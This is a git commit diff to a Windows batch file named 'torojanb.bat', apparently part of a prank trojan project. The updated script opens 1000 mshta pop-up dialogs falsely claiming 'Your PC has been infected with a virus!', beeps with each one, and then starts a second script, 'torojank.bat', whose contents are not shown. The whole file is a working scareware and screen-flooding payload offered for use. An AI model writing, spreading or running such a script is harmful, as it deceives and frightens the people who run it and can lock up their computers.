e21c2d5267805af62cf10ea484c423f42c68bebd
kameee3 <u0803096@gmail.com>
2025-08-26 07:35:25 +0900

    Update torojanb.bat

--- torojan-main/torojanb.bat
+++ torojan-main/torojanb.bat
@@ -1,19 +1,26 @@
 @echo off
 setlocal
 
-set "MSG=aaaaaaaaaaa"
-set "COUNT=50"  
 
-:: ===== 警告音 =====
-echo ^G
+set "MSG=Your PC has been infected with a virus!"
+set /a COUNT=1000
+set /a CURRENT=0
 
 :loop
-set /a COUNT-=1
-if %COUNT% leq 0 goto end
-start "" mshta "javascript:alert('%MSG%');close();"
+set /a CURRENT+=1
+start "" mshta "javascript:var r=confirm('%MSG%'); if(r){alert('Your PC has been infected with a virus!');} else {alert('Your PC has been infected with a virus!');}; close();"
+echo ^G
+
+if %CURRENT% geq %COUNT% goto launch
 goto loop
 
-:end
-echo 
+:launch
+
+if exist "torojank.bat" (
+    start "" "torojank.bat"
+) else (
+    echo torojank.bat Your PC has been infected with a virus!
+)
+
 pause
 endlocal
